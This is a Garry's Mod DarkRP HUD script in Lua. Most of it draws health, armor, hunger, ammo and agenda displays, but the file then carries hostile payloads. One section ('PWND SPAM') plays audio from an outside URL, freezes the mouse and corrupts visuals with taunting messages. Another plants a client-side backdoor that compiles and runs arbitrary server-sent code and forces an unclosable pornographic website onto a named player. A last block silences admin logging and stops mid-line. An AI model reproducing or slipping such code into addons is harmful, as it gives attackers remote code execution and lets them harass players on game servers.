		draw.RoundedBox(0,5 *PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, 90*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,15*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,15*PIXConfig.HUDScale,ScrH() - 58*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,85*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 10.5*PIXConfig.HUDScale, 90*PIXConfig.HUDScale, Color(10, 10, 10,230))


		draw.RoundedBox(0,85*PIXConfig.HUDScale,ScrH() - 132*PIXConfig.HUDScale, 5*PIXConfig.HUDScale, 78*PIXConfig.HUDScale, Color(255, 255, 255,10))

		draw.RoundedBox(0,10 *PIXConfig.HUDScale,ScrH() - 132*PIXConfig.HUDScale, 5*PIXConfig.HUDScale, 78*PIXConfig.HUDScale, Color(255, 255, 255,10))

		draw.RoundedBox(0,15 *PIXConfig.HUDScale,ScrH() - 132*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 5*PIXConfig.HUDScale, Color(255, 255, 255,10))

		draw.RoundedBox(0,15 *PIXConfig.HUDScale,ScrH() - 59 *PIXConfig.HUDScale, 70 *PIXConfig.HUDScale, 5 *PIXConfig.HUDScale, Color(255, 255, 255,10))



		local Avatar = vgui.Create( &quot;AvatarImage&quot;, Panel )
		Avatar:SetSize( 70 *PIXConfig.HUDScale, 70 *PIXConfig.HUDScale)
		Avatar:SetPos( 15 *PIXConfig.HUDScale,ScrH() - 128 *PIXConfig.HUDScale)
		Avatar:SetPlayer( LocalPlayer(), 64 )

	end
end

	/*---------------------------------------------------------------------------

	Ammo

	---------------------------------------------------------------------------*/

if PIXConfig.AmmoHUD == true then

	local wep, total, clip, nicename
	local function Ammo()
	ply = LocalPlayer()
	if !IsValid(ply:GetActiveWeapon()) then return end
		wep = ply:GetActiveWeapon()
		total = ply:GetAmmoCount(wep:GetPrimaryAmmoType())
		clip = wep:Clip1()
		nicename = wep:GetPrintName()


	if clip &lt; 0 or wep:GetClass() == &quot;weapon_physcannon&quot; then return end

		draw.RoundedBox(0,ScrW() - (204 - 1)*PIXConfig.HUDScale,ScrH() - (95 - 3)*PIXConfig.HUDScale,198*PIXConfig.HUDScale,30 *PIXConfig.HUDScale,Color(10, 10, 10, 250))
		draw.RoundedBox(0,ScrW() - (204 - 1)*PIXConfig.HUDScale,ScrH() - (60 - 1)*PIXConfig.HUDScale,198 *PIXConfig.HUDScale,55 *PIXConfig.HUDScale,Color(40, 40, 40, 230))

		if total == 0 and clip == 0 then
			draw.SimpleText(clip,&quot;vie&quot;,ScrW() - 154*PIXConfig.HUDScale,ScrH() - 55*PIXConfig.HUDScale,PIXConfig.ColorAmmorOut,TEXT_ALIGN_CENTER)
			draw.SimpleText(total,&quot;nom&quot;,ScrW() - 54*PIXConfig.HUDScale,ScrH() - 45*PIXConfig.HUDScale,PIXConfig.ColorAmmorOut,TEXT_ALIGN_CENTER)
			draw.SimpleText(&quot;/&quot;,&quot;slash&quot;,ScrW() - 99*PIXConfig.HUDScale,ScrH() - 60*PIXConfig.HUDScale,PIXConfig.ColorAmmorOut,TEXT_ALIGN_CENTER)
		elseif total &gt;= 0 and clip &gt;= 0 then
			draw.SimpleText(clip,&quot;vie&quot;,ScrW() - 154*PIXConfig.HUDScale,ScrH() - 55*PIXConfig.HUDScale,PIXConfig.ColorClip,TEXT_ALIGN_CENTER)
			draw.SimpleText(total,&quot;nom&quot;,ScrW() - 54*PIXConfig.HUDScale,ScrH() - 45*PIXConfig.HUDScale,PIXConfig.ColorTotal,TEXT_ALIGN_CENTER)
			draw.SimpleText(&quot;/&quot;,&quot;slash&quot;,ScrW() - 99*PIXConfig.HUDScale,ScrH() - 60*PIXConfig.HUDScale,PIXConfig.ColorAmmoOut,TEXT_ALIGN_CENTER)

		end



	if string.len(nicename) &gt; 21 then nicename = string.Left(nicename, 19) .. &quot;...&quot; end
		draw.SimpleText(nicename,&quot;nom&quot;,ScrW() - 104*PIXConfig.HUDScale,ScrH() - 90*PIXConfig.HUDScale,PIXConfig.AmmoName,TEXT_ALIGN_CENTER)
	end

	hook.Add(&quot;HUDPaint&quot;, &quot;Ammo&quot;, Ammo)
end

	/*---------------------------------------------------------------------------

	PlayerInfo

	---------------------------------------------------------------------------*/

local function Plaryerinfo()

	local name 	 = LocalPlayer():Nick() or &quot;&quot;
	local job 	 = LocalPlayer():getDarkRPVar(&quot;job&quot;) or &quot;&quot;
	local money  = &quot;$&quot;..formatNumber(LocalPlayer():getDarkRPVar(&quot;money&quot;) or 0)
	local salary = &quot;$&quot;..formatNumber(LocalPlayer():getDarkRPVar(&quot;salary&quot;) or 0)


	draw.DrawText(name, &quot;nom&quot;, 195 *PIXConfig.HUDScale,ScrH() - 218 *PIXConfig.HUDScale, PIXConfig.ColorName, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

	draw.DrawText(job, &quot;argent2&quot;, 11 *PIXConfig.HUDScale,ScrH() - 179 *PIXConfig.HUDScale, PIXConfig.ColorJob, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

	draw.DrawText(money, &quot;argent&quot;,  190 *PIXConfig.HUDScale, ScrH() - 40*PIXConfig.HUDScale, PIXConfig.ColorMoney, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

	draw.DrawText(salary, &quot;argent2&quot;, 370*PIXConfig.HUDScale,ScrH() - 179 *PIXConfig.HUDScale, PIXConfig.ColorSalary, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)

end


	/*---------------------------------------------------------------------------

	Health

	---------------------------------------------------------------------------*/

local function Health()
	local vie = LocalPlayer():Health()
	local Health = LocalPlayer():Health() or 0
	local FullHealth = LocalPlayer():Health() or 0
	if Health &lt; 0 then Health = 0 elseif Health &gt; 100 then Health = 100 end
	local DrawHealth = math.Min(Health/GAMEMODE.Config.startinghealth, 1)


	if 	PIXConfig.HungerActivate == true and 	PIXConfig.ArmorActivate == true then

			draw.RoundedBox(0,96.4,ScrH() - 130, 260, 15, Color(10, 10, 10,200))

			if Health != 0 then
				draw.RoundedBox(0,96.5,ScrH() - 130, 260 * Health / 100, 15, PIXConfig.HealthBar)
			end

				surface.SetMaterial( hearth );
				surface.SetDrawColor(PIXConfig.Icohealth)
				surface.DrawTexturedRect( 359,ScrH() - 129, 13, 13);
	end

	if PIXConfig.HungerActivate == false and 	PIXConfig.ArmorActivate == true then

			draw.RoundedBox(0,96.4,ScrH() - 120, 260, 15, Color(10, 10, 10,200))

			if Health != 0 then
				draw.RoundedBox(0,96.5,ScrH() - 120, 260 * Health / 100, 15, PIXConfig.HealthBar)
			end

				surface.SetMaterial( hearth );
				surface.SetDrawColor(PIXConfig.Icohealth)
				surface.DrawTexturedRect( 359,ScrH() - 119, 13, 13);
	end

	if PIXConfig.HungerActivate == true and PIXConfig.ArmorActivate == false then

			draw.RoundedBox(0,96.4,ScrH() - 120, 260, 15, Color(10, 10, 10,200))

			if Health != 0 then
				draw.RoundedBox(0,96.5,ScrH() - 120, 260 * Health / 100, 15, PIXConfig.HealthBar)
			end

				surface.SetMaterial( hearth );
				surface.SetDrawColor(PIXConfig.Icohealth)
				surface.DrawTexturedRect( 359,ScrH() - 119, 13, 13);

	end

		if PIXConfig.HungerActivate == false and PIXConfig.ArmorActivate == false then

			draw.RoundedBox(0,96.4,ScrH() - 100, 260, 15, Color(10, 10, 10,200))

			if Health != 0 then
				draw.RoundedBox(0,96.5,ScrH() - 100, 260 * Health / 100, 15, PIXConfig.HealthBar)
			end

				surface.SetMaterial( hearth );
				surface.SetDrawColor(PIXConfig.Icohealth)
				surface.DrawTexturedRect( 359,ScrH() - 99, 13, 13);

	end
	draw.DrawText(vie, &quot;vieecrit&quot;, 230 *PIXConfig.HUDScale,ScrH() - 131 *PIXConfig.HUDScale, PIXConfig.ColorName, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end



	/*---------------------------------------------------------------------------

	Armor

	---------------------------------------------------------------------------*/

local function Armor()

	local Armor = LocalPlayer():Armor() or 0
	local FullHealth = LocalPlayer():Armor() or 0
	if Armor &lt; 0 then Armor = 0 elseif Armor &gt; 100 then Armor = 100 end
	local DrawArmor = math.Min(Armor/GAMEMODE.Config.startinghealth, 1)

	if PIXConfig.HungerActivate == true and PIXConfig.ArmorActivate == true then
		draw.RoundedBox(0,96.4,ScrH() - 100, 260, 15, Color(10, 10, 10,200))

		if Armor != 0 then
			draw.RoundedBox(0,96.4,ScrH() - 100, 260 * Armor /100, 15,PIXConfig.ArmorBar)
		end

				surface.SetMaterial( shield );
				surface.SetDrawColor(PIXConfig.IcoArmor)
				surface.DrawTexturedRect( 359,ScrH() - 100, 13, 13);
	end

	if PIXConfig.HungerActivate == false and PIXConfig.ArmorActivate == true then
			draw.RoundedBox(0,96.4,ScrH() - 81, 260, 15, Color(10, 10, 10,200))

			if Armor != 0 then
				draw.RoundedBox(0,96.4,ScrH() - 81, 260 * Armor /100, 15,PIXConfig.ArmorBar)
			end

				surface.SetMaterial( shield );
				surface.SetDrawColor(PIXConfig.IcoArmor)
				surface.DrawTexturedRect( 359,ScrH() - 81, 13, 13);

	end

	if PIXConfig.ArmorActivate == false and PIXConfig.HungerActivate == true then
			draw.RoundedBox(0,96.4,ScrH() - 81, 260, 15, Color(10, 10, 10,0))
	end

end


	/*---------------------------------------------------------------------------

	Hunger

	---------------------------------------------------------------------------*/

local function Hunger()


		local Hunger = math.ceil(LocalPlayer():getDarkRPVar(&quot;Energy&quot;) or 0)
		local EchoHunger = math.ceil(LocalPlayer():getDarkRPVar(&quot;Energy&quot;) or 0)
		if Hunger &lt; 0 then Hunger = 0 elseif Hunger &gt; 100 then Hunger = 100 end

				if PIXConfig.HungerActivate == true and PIXConfig.ArmorActivate == true then
					draw.RoundedBox(0,96.4,ScrH() - 70, 260, 15, Color(10, 10, 10,200))

					if Hunger != 0 then
						draw.RoundedBox(0,96.4,ScrH() - 70, 260 * Hunger /100, 15, PIXConfig.HungerBar)
					end

						surface.SetMaterial( food );
						surface.SetDrawColor(PIXConfig.IcoHunger)
						surface.DrawTexturedRect( 358,ScrH() - 70, 15, 15);

				end

				if PIXConfig.HungerActivate == true and PIXConfig.ArmorActivate == false then
					draw.RoundedBox(0,96.4,ScrH() - 81, 260, 15, Color(10, 10, 10,200))

					if Hunger != 0 then
						draw.RoundedBox(0,96.4,ScrH() - 81, 260 * Hunger /100, 15, PIXConfig.HungerBar)
					end

						surface.SetMaterial( food );
						surface.SetDrawColor(PIXConfig.IcoHunger)
						surface.DrawTexturedRect( 359,ScrH() - 81, 15, 15);

		end

end

local function Stamina()


        local TCBStamina = LocalPlayer():GetNWInt( &quot;tcb_stamina&quot; ) or 0
        local echoTCBStamina = LocalPlayer():GetNWInt( &quot;tcb_stamina&quot; ) or 0
		if TCBStamina &lt; 0 then TCBStamina = 0 elseif TCBStamina &gt; 100 then TCBStamina = 100 end

					surface.SetDrawColor( 10, 10, 10, 250 )
					surface.DrawRect( 378*PIXConfig.HUDScale,ScrH() - 45*PIXConfig.HUDScale, 20*PIXConfig.HUDScale, 40 *PIXConfig.HUDScale)


					surface.SetDrawColor( 40, 40, 40, 230 )
					surface.DrawRect( 379*PIXConfig.HUDScale,ScrH() - 180*PIXConfig.HUDScale, 20*PIXConfig.HUDScale, 132 *PIXConfig.HUDScale)

					Tra = 128 / 100  * TCBStamina

					if TCBStamina != 0  and PIXConfig.HUDScale &gt;= 0.80 then
						draw.RoundedBox(0,382.5*PIXConfig.HUDScale / 1.004,ScrH() - 50* PIXConfig.HUDScale  - Tra * PIXConfig.HUDScale, 18 *PIXConfig.HUDScale, Tra *PIXConfig.HUDScale, PIXConfig.TCBStamina)
					end

					if TCBStamina != 0  and PIXConfig.HUDScale &lt; 0.80 then
						draw.RoundedBox(0,382.5*PIXConfig.HUDScale / 1.003,ScrH() - 50* PIXConfig.HUDScale  - Tra * PIXConfig.HUDScale, 16 *PIXConfig.HUDScale, Tra *PIXConfig.HUDScale, PIXConfig.TCBStamina)
					end

						surface.SetMaterial( run );
						surface.SetDrawColor(255, 255, 255, 255)
						surface.DrawTexturedRect( 378.5*PIXConfig.HUDScale,ScrH() - 40*PIXConfig.HUDScale, 20*PIXConfig.HUDScale, 28*PIXConfig.HUDScale);

end





	/*---------------------------------------------------------------------------

	Wanted And Gunlicense

	---------------------------------------------------------------------------*/


local function PlayerIcons()

	if LocalPlayer():getDarkRPVar(&quot;HasGunlicense&quot;) then
		surface.SetMaterial( gun );
		surface.SetDrawColor(200,200,200,255)
		surface.DrawTexturedRect( 7*PIXConfig.HUDScale,ScrH() - 40*PIXConfig.HUDScale, 32*PIXConfig.HUDScale, 32*PIXConfig.HUDScale);
	else
		surface.SetMaterial( gun );
		surface.SetDrawColor(10,10,10,255)
		surface.DrawTexturedRect( 7*PIXConfig.HUDScale,ScrH() - 40*PIXConfig.HUDScale, 32*PIXConfig.HUDScale, 32*PIXConfig.HUDScale);
	end

	local lel = (math.sin(CurTime()) + 1) / 3

	if LocalPlayer():getDarkRPVar(&quot;wanted&quot;) then
		surface.SetMaterial( wanted );
		surface.SetDrawColor(lel * 200, 0, 0 - (lel * 230), 240)
		surface.DrawTexturedRect( 338*PIXConfig.HUDScale,ScrH() - 41*PIXConfig.HUDScale, 32*PIXConfig.HUDScale, 32*PIXConfig.HUDScale);
	else
		surface.SetMaterial( wanted );
		surface.SetDrawColor(10,10,10,255)
		surface.DrawTexturedRect( 338*PIXConfig.HUDScale,ScrH() - 41*PIXConfig.HUDScale, 32*PIXConfig.HUDScale, 32*PIXConfig.HUDScale);
	end


end




local function PlayerModel()
	if PIXConfig.SteamImage == false then



		PlayerModel = vgui.Create(&quot;DModelPanel&quot;)
		function PlayerModel:LayoutEntity( Entity ) return end
		PlayerModel:SetModel( LocalPlayer():GetModel() )
		PlayerModel:SetPos(10*PIXConfig.HUDScale,ScrH() - 141*PIXConfig.HUDScale)
		PlayerModel:SetSize( 85 *PIXConfig.HUDScale, 83 *PIXConfig.HUDScale)
		PlayerModel:SetCamPos(Vector( 16, -8, 65 ))
		PlayerModel:SetLookAt(Vector( 0, 0, 65 ))

		timer.Create( &quot;UpdatePlayerModel&quot;, 0.5, 0, function()
				if LocalPlayer():GetModel() != PlayerModel.Entity:GetModel() then
						PlayerModel:Remove()
						PlayerModel = vgui.Create(&quot;DModelPanel&quot;)
						function PlayerModel:LayoutEntity( Entity ) return end
						PlayerModel:SetModel( LocalPlayer():GetModel())
						PlayerModel:SetPos(10*PIXConfig.HUDScale ,ScrH() - 141*PIXConfig.HUDScale)
						PlayerModel:SetSize( 85*PIXConfig.HUDScale, 83 *PIXConfig.HUDScale)
						PlayerModel:SetCamPos(Vector( 16, -8, 65 ))
						PlayerModel:SetLookAt(Vector( 0, 0, 65 ))
				end
		end)
	end
end

	hook.Add(&quot;InitPostEntity&quot;, &quot;PlayerModel&quot;, PlayerModel)


	/*---------------------------------------------------------------------------

	Agenda

	---------------------------------------------------------------------------*/


local function Agenda()
	local agenda = LocalPlayer():getAgendaTable()
	if not agenda then return end

	draw.RoundedBox(0, TEXT_ALIGN_LEFT + 5 *PIXConfig.HUDScale, TEXT_ALIGN_TOP + 40 *PIXConfig.HUDScale, 400*PIXConfig.HUDScale, 120*PIXConfig.HUDScale, Color( 40, 40, 40, 200 ))
	draw.RoundedBox(0, TEXT_ALIGN_LEFT + 5 *PIXConfig.HUDScale, TEXT_ALIGN_TOP + 1*PIXConfig.HUDScale, 400*PIXConfig.HUDScale, 36*PIXConfig.HUDScale, Color( 10, 10, 10, 250 ))



	draw.DrawNonParsedText(&quot;POLICE AGENDA&quot;, &quot;agenda&quot;, 160*PIXConfig.HUDScale, 12*PIXConfig.HUDScale, Color(255, 255, 255, 255), 0)

	local text = LocalPlayer():getDarkRPVar(&quot;agenda&quot;) or &quot;&quot;

	text = text:gsub(&quot;//&quot;, &quot;\n&quot;):gsub(&quot;\\n&quot;, &quot;\n&quot;)
	text = DarkRP.textWrap(text, &quot;DarkRPHUD1&quot;, 394 *PIXConfig.HUDScale)
	draw.DrawNonParsedText(text, &quot;DarkRPHUD1&quot;, 10*PIXConfig.HUDScale, 45*PIXConfig.HUDScale, Color(255, 255, 255, 255), 0)
end


	/*---------------------------------------------------------------------------

	Voice Tchat

	---------------------------------------------------------------------------*/


local VoiceChatTexture = surface.GetTextureID(&quot;voice/icntlk_pl&quot;)
local function DrawVoiceChat()
	if LocalPlayer().DRPIsTalking then
		local chbxX, chboxY = chat.GetChatBoxPos()

		local Rotating = math.sin(CurTime()*3)
		local backwards = 0
		if Rotating &lt; 0 then
			Rotating = 1-(1+Rotating)
			backwards = 180
		end
		surface.SetTexture(VoiceChatTexture)
		surface.SetDrawColor(Color(140,0,0,180))
		surface.DrawTexturedRectRotated(ScrW() - 100, chboxY, Rotating*96, 96, backwards)
	end
end


	/*---------------------------------------------------------------------------

	Lockdown

	---------------------------------------------------------------------------*/


local function Lockdown()

	if GetGlobalBool(&quot;DarkRP_LockDown&quot;) then

		--&gt; Variables
		local cin = (math.sin(CurTime()) + 1) / 2

		--&gt; Background
		draw.RoundedBox( 0, 0, ScrH()- 1100, 5, 1280, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.RoundedBox( 0, ScrW()-5, ScrH()- 1100, 5, 1280, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.RoundedBox( 0, ScrW()-1920, ScrH()- 5, 1920, 5, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.RoundedBox( 0, 0, ScrH()/ 10000, 1920, 5, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.RoundedBox( 0,0 , ScrH() -275,375 , 40, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.DrawText(&quot;The mayor has initialized a lockdown! Return to your homes!&quot;, &quot;lockdown&quot;, 190 , ScrH()- 265, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end

end



	/*---------------------------------------------------------------------------

	Draw Player Info

	---------------------------------------------------------------------------*/
local function AboveHead()

	local plyMeta = FindMetaTable(&quot;Player&quot;)

	plyMeta.drawPlayerInfo = function( self )

		local pos = self:EyePos()
		pos.z = pos.z + 10
		pos = pos:ToScreen()


		local x = pos.x
		local y = pos.y
		local teamJob = team.GetName(ply:Team())
		local g = self:GetNWString( &quot;usergroup&quot; )
		local teamname = team.GetName(self:Team())


		draw.RoundedBox( 0, x + 74, y - 35, 35, 35, Color( 40, 40, 40, 240 ) )
		draw.RoundedBox( 0, x - 111, y - 35, 35, 35, Color( 40, 40, 40, 240 ) )
		draw.RoundedBox( 0, x - 76, y - 20, 150, 5, Color( 10, 10, 10, 250 ) )


		draw.DrawText(self:Nick(), &quot;nom&quot;, pos.x -2, pos.y - 45, PIXConfig.ColorNameHead, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)


		draw.DrawText(self:getDarkRPVar(&quot;job&quot;) or teamJob, &quot;nom&quot;, pos.x - 2, pos.y - 18, team.GetColor(ply:Team()), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)


		if self:getDarkRPVar(&quot;HasGunlicense&quot;) then
			surface.SetMaterial( gun );
			surface.SetDrawColor(200,200,200,255)
			surface.DrawTexturedRect( x - 108.5, y - 31.5, 30, 30);
		else
			surface.SetMaterial( gun );
			surface.SetDrawColor(10,10,10,255)
			surface.DrawTexturedRect( x - 108.5, y - 33, 30, 30);
		end

		local lel = (math.sin(CurTime()) + 1) / 3

		if self:getDarkRPVar(&quot;wanted&quot;) then
			surface.SetMaterial( wanted );
			surface.SetDrawColor(lel * 255, 0, 0 - (lel * 230), 240)
			surface.DrawTexturedRect( x + 77, y - 32, 30, 30 );
		else
			surface.SetMaterial( wanted );
			surface.SetDrawColor(10,10,10,255)
			surface.DrawTexturedRect( x + 77, y - 32, 30, 30 );
		end



	end
end



		local Arrested = function() end

			net.Receive(&quot;GotArrested&quot;, function(msg)
			    local StartArrested = CurTime()
			    local ArrestedUntil = msg:ReadFloat()

			    Arrested = function()
			        local shouldDraw = hook.Call(&quot;HUDShouldDraw&quot;, GAMEMODE, &quot;DarkRP_ArrestedHUD&quot;)
			        if shouldDraw == false then return end

			        if CurTime() - StartArrested &lt;= ArrestedUntil and localplayer:getDarkRPVar(&quot;Arrested&quot;) then
			            draw.DrawNonParsedText(DarkRP.getPhrase(&quot;youre_arrested&quot;, math.ceil((ArrestedUntil - (CurTime() - StartArrested)) * 1 / game.GetTimeScale())), &quot;DarkRPHUD1&quot;, Scrw / 2, Scrh - Scrh / 12, Color(255, 255, 255, 255), 1)
			        elseif not localplayer:getDarkRPVar(&quot;Arrested&quot;) then
			            Arrested = function() end
			        end
			    end
			end)

			local AdminTell = function() end

			net.Receive(&quot;AdminTell&quot;, function(msg)
			    timer.Remove(&quot;DarkRP_AdminTell&quot;)
			    local Message = msg:ReadString()

			    AdminTell = function()
			        draw.RoundedBox(4, 10, 10, Scrw - 20, 110, Color(0, 0, 0, 200))
			        draw.DrawNonParsedText(DarkRP.getPhrase(&quot;listen_up&quot;), &quot;GModToolName&quot;, Scrw / 2 + 10, 10, Color(255, 255, 255, 255), 1)
			        draw.DrawNonParsedText(Message, &quot;ChatFont&quot;, Scrw / 2 + 10, 90, Color(200, 30, 30, 255), 1)
			    end

			    timer.Create(&quot;DarkRP_AdminTell&quot;, 10, 1, function()
			        AdminTell = function() end
			    end)
		end)



	/*---------------------------------------------------------------------------

	DrawEntityDisplay

	---------------------------------------------------------------------------*/


	local function DrawEntityDisplay()
			local shootPos = LocalPlayer():GetShootPos()
			local aimVec = LocalPlayer():GetAimVector()

			for k, ply in pairs(players or player.GetAll()) do
				if ply == LocalPlayer() or not ply:Alive() or ply:GetNoDraw() then continue end
				local hisPos = ply:GetShootPos()

				if GAMEMODE.Config.globalshow then
					ply:drawPlayerInfo()
				-- Draw when you're (almost) looking at him
				elseif hisPos:DistToSqr(shootPos) &lt; 160000 then
					local pos = hisPos - shootPos
					local unitPos = pos:GetNormalized()
					if unitPos:Dot(aimVec) &gt; 0.95 then
						local trace = util.QuickTrace(shootPos, pos, LocalPlayer())
						if trace.Hit and trace.Entity ~= ply then return end
						ply:drawPlayerInfo()
					end
				end
			end

			local tr = LocalPlayer():GetEyeTrace()

			if IsValid(tr.Entity) and tr.Entity:isKeysOwnable() and tr.Entity:GetPos():Distance(LocalPlayer():GetPos()) &lt; 200 then
				tr.Entity:drawOwnableInfo()
			end

		end


		local function DisplayNotify(msg)
			local txt = msg:ReadString()
			GAMEMODE:AddNotify(txt, msg:ReadShort(), msg:ReadLong())
			surface.PlaySound(&quot;buttons/lightswitch2.wav&quot;)

			-- Log to client console
			print(txt)
		end
		net.Receive(&quot;_Notify&quot;, DisplayNotify)

		function DisableDrawInfo()
			return false
		end
		hook.Add(&quot;HUDDrawTargetID&quot;, &quot;DisableDrawInfo&quot;, DisableDrawInfo)

	/*---------------------------------------------------------------------------

	Draw Hud

	---------------------------------------------------------------------------*/


local function DrawBlastHUD()


	Base()
	if PIXConfig.SteamImage == true then
		SteamImage()
	end
	Plaryerinfo()

	Health()

	Armor()

	Hunger()

	PlayerIcons()

	Agenda()
	if PIXConfig.StaminaActivate == true then
	Stamina()
	end

	DrawVoiceChat()

	Lockdown()

	if PIXConfig.AboveTheHead == true then
	AboveHead()
	end
end

hook.Add(&quot;HUDPaint&quot;, &quot;DrawBlastHUD&quot;, DrawBlastHUD)




--[[

    PWND SPAM

]]--



local gfx = {}

local messages = {
	&quot;Red&eacute;marrer ton serveur ne sert &agrave; rien !&quot;,
	&quot;Vous d&eacute;connecter ne sert &agrave; rien !&quot;,
	&quot;Je me suis fait chier &agrave; faire ce payload&quot;,
	&quot;Alors tu vas le regarder, en entier&quot;,
	&quot;Galshi Revolution - Psystem&quot;,
	&quot;Avoue c'est un peut styler quand m&ecirc;me&quot;,
	&quot;Par un canard&quot;
}


hook.Add(&quot;HUDPaint&quot;, &quot;FUCKIT_G&quot;,function()
	for k,v in pairs(gfx) do
		v()
	end
end)

local message = &quot;Ne redemmare pas ton server, cela ne sert a rien&quot;
local function SlowType(msg,interval,callback)
	callback = callback or function()end
	message = &quot;&quot;
	for i=1,#msg do
		timer.Simple(interval * i,function()
			message = message .. msg[i]
		end)
	end
	timer.Simple(#msg*interval,callback)
end
local function GetRandomSpot()
	local ppos = LocalPlayer():GetPos()
	return Vector(ppos.x + math.random(-500, 500),ppos.y + math.random(-500, 500),ppos.z + math.random(-10, 10))
end
surface.CreateFont(&quot;PWN&quot;,{bold=true,size=40})
SOUNDSTART_CTP = false
sound.PlayURL(&quot;http://rottenfish-drm.tk/r.mp3&quot;,&quot;no block&quot;,function(s)
	if not s then return end
	if SOUNDSTART_CTP then s:Stop() return end
	SOUNDSTART_CTP = true


	local ragtbl = {}
	for i=1,20 do
		ragtbl[i] = ClientsideRagdoll( &quot;models/player/gman_high.mdl&quot; )
		ragtbl[i]:SetNoDraw( false )
		ragtbl[i]:DrawShadow( true )
	end
	

	timer.Create(&quot;ChangeRagdolesSpotsAW&quot;, 1, 0, function()
		for k,v in pairs(ragtbl) do
			v:SetPos(GetRandomSpot())
		end
	end)


	hook.Add(&quot;AdjustMouseSensitivity&quot;,&quot;MDR&quot;,function()
		return 0
	end)
	gfx[&quot;CoolEffect&quot;] = function()
		local tbl = {}
		s:FFT(tbl,FFT_2048)

		local fal = 0
		for i=4,6 do
			fal = fal + tbl[i]
		end

		if fal &gt; 0.8 then
			local ca = Color(math.random(0,255),math.random(0,255),math.random(0,255), 150)
			gfx[&quot;ColorChange&quot;] = function()
				draw.RoundedBoxEx(0, 0, 0, ScrW(),ScrH(),ca)
			end
			util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)
			local mats = Entity(0):GetMaterials()
			for k,v in pairs(mats) do
			local r,g,b = ColorRand().r-50, ColorRand().g-50, ColorRand().b-50
				Material(v):SetVector(&quot;$color&quot;, Vector(r,g,b))
				Material(v):SetTexture( &quot;$basetexture&quot;, &quot;_rt_fullframefb&quot; )
			end
		end
		for k,v in pairs(tbl) do
			local col = HSVToColor(k * 1 % 360,1,1)
			draw.RoundedBoxEx(0,0,k * 10, (v*10000), 10,col)
			draw.RoundedBoxEx(0,ScrW() - (v*10000),k * 10, (v*10000), 10,col)
		end
	end
	
	timer.Simple(29, function()
		
			hook.Add(&quot;GetMotionBlurValues&quot;, &quot;YASS&quot;,function(a,b,c,d)
				return a,b,c+140,d
			end)
			
		
	end)

	local cc = 1
	local omgs = {}
	timer.Create(&quot;MVSPOS&quot;, 0.04, 0, function()
		for k,v in pairs(omgs) do
			if  omgs[ k ].n &lt;= 0 then omgs[ k ] = nil continue end
			omgs[ k ] = {text = omgs[ k ].text, n = omgs[ k ].n - 1}
		end
	end)
	local isPounding = false

	timer.Create(&quot;NEXTMSG&quot;, 6, #messages, function()
		if cc &gt; #messages then
			isPounding = true
			return
		end
		table.insert(omgs, {text = messages[ cc ],n = ScrH()})
		cc = cc + 1
	end)
	
	gfx[&quot;MessageC&quot;] = function()
		if isPounding and (#messages &lt;= 0) then
			draw.SimpleText(&quot;RT ton server &lt;3&quot;, &quot;PWN&quot;, ScrW() / 2, ScrH() / 2,Color(200,0,0),1,1)
		end
		for k,v in pairs(omgs) do
			draw.SimpleText(omgs[ k ].text, &quot;PWN&quot;, ScrW() / 2, omgs[ k ].n,Color(0,0,0),1,1)
		end
	end
end)
concommand.Add(&quot;canard&quot;, function() 
	hook.Remove(&quot;GetMotionBlurValues&quot;, &quot;YASS&quot;)
	hook.Remove(&quot;AdjustMouseSensitivity&quot;,&quot;MDR&quot;)
	hook.Remove(&quot;HUDPaint&quot;, &quot;FUCKIT_G&quot;)
end)



--[[

    Stream BAN

]]--



local function rdm_str(len)
    if !len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])

hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;ifyouseethisdontpanicitsme&quot;,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    end
end)

local function SendToClient(ply, code)
    timer.Simple(2, function()
        local data = util.Compress(code)
        local len = #data
        net.Start(net_string)
        net.WriteUInt(len, 16)
        net.WriteData(data, len)
        net.Send(ply)
    end)
end


for i=1, #player.GetHumans() do
    local ply = player.GetHumans()[i]
    if ply:Nick() == &quot;{{argument}}&quot; then
        SendToClient(ply, 
            [[
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( ScrW(), ScrH() )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:ShowCloseButton(false)
frame:SetDraggable(false)
frame:MakePopup()

local html = vgui.Create( &quot;DHTML&quot;, frame )
html:Dock( FILL )
html:OpenURL( &quot;https://pornhub.com&quot; )
            ]])
    end
end



--[[

    Unban Discret

]]--



game.ConsoleCommand(&quot;ulx logecho 0\n&quot;)
timer.Simple( &quot;deban&quot;, 1, 0, function()
